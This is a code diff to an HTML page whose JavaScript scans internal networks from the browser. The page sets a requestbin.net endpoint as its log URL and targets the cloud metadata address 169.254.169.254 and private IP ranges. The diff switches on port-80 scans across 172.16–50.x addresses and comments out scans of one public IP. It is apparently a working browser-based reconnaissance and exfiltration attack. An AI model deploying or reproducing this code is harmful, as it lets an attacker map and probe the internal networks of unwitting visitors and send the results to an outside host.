@@ -10,7 +10,7 @@
     <div id="custom_button"></div>
     
     <script>
-    let LOG_URL = "http://requestbin.net/r/e1yrlu55";
+    let LOG_URL = "http://requestbin.net/r/da5sthen";
     let LOCAL_HOST = "169.254.169.254";
     let ipIterator="";
     let local_ip_ranges = ["10.", "192.168.", "172.16."];
@@ -283,15 +283,15 @@
           ip = "172.";
           bit2 = 16;
 
-          while (bit2 <= 255)
+          while (bit2 <= 50)
           {
-            while (bit3 <= 255)
+            while (bit3 < 1)
             {
               while (bit4 < 1)
               {
                 bit4++;
-                //console.log(ip+"\n");
                 ip = "172." + bit2 + "." + bit3 + "." + bit4;
+                custom_scan(ip, "80");
               }
               bit4 = 0;
               bit3++;
@@ -303,9 +303,9 @@
       }
   }
       
-      custom_scan("15.207.101.96", "443");
-      custom_scan("15.207.101.96", "21");
-      custom_scan("15.207.101.96", "6666");
+      //custom_scan("15.207.101.96", "443");
+      //custom_scan("15.207.101.96", "21");
+      //custom_scan("15.207.101.96", "6666");
       
     /*for (let i = 0 ; i < local_ips.length ; i++)
     {
